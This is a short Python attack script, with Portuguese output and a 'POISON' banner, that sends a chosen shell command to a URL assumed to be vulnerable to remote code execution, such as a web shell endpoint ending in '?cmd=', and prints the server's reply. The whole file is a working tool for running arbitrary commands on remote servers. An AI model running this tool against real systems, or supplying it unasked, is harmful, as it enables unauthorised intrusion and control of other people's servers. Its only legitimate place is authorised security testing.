import os
import requests
import argparse

def banner():
    banner_text = """
██████╗░░█████╗░██╗░██████╗░█████╗░███╗░░██╗
██╔══██╗██╔══██╗██║██╔════╝██╔══██╗████╗░██║
██████╔╝██║░░██║██║╚█████╗░██║░░██║██╔██╗██║
██╔═══╝░██║░░██║██║░╚═══██╗██║░░██║██║╚████║
██║░░░░░╚█████╔╝██║██████╔╝╚█████╔╝██║░╚███║
"""
    
    terminal_width = os.get_terminal_size().columns
    
    for line in banner_text.splitlines():
        print(line.center(terminal_width))

banner()

print()

def test_rce(url, command):
    try:
        
        target_url = f"{url}{command}"
        print(f"[+] Testando: {target_url}")

        
        response = requests.get(target_url, timeout=10)

        
        if response.status_code == 200:
            print("[+] Resposta do servidor:")
            print(response.text)
        else:
            print(f"[-] Falha: Código de status HTTP {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Erro durante a solicitação: {e}")

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description="Script para testar vulnerabilidade RCE em URLs")
    parser.add_argument("-u", "--url", required=True, help="URL vulnerável (exemplo: https://site.com/rce.php?cmd=)")
    parser.add_argument("-c", "--command", required=True, help="Comando a ser executado no servidor (exemplo: id)")
    args = parser.parse_args()

    
    test_rce(args.url, args.command)
